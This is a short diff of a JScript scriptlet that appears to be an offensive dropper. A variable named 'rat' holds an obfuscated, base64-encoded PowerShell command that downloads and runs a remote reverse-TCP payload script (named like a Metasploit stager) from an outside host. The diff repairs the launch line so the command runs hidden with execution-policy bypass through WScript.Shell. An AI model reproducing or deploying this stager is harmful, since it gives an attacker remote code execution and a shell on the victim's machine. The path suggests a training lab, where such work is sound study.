@@ -8,7 +8,7 @@
     <script language="JScript">
         <![CDATA[
             rat = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADcALgAxADcAOAAuADEAMQA6ADEAOAAwADgAMAAvAGUAdgBpAGwALQBwAHMALwByAGUAdgBlAHIAcwBlAF8AdABjAHAALwBMAGEAYgAxADQANAA0ADQALwBtAHMAZgBfAHgAOAA2AC4AcABzADEAJwApAAoA"
-            ps  = "cmd.exe /c -NonInteractive -nop -exec Bypass -w hidden -enc "
+            ps  = "cmd.exe /c powershell -NonInteractive -nop -exec Bypass -w hidden -enc "
             new ActiveXObject("WScript.Shell").Run(ps + rat,0,true);
         ]]>
 </script>
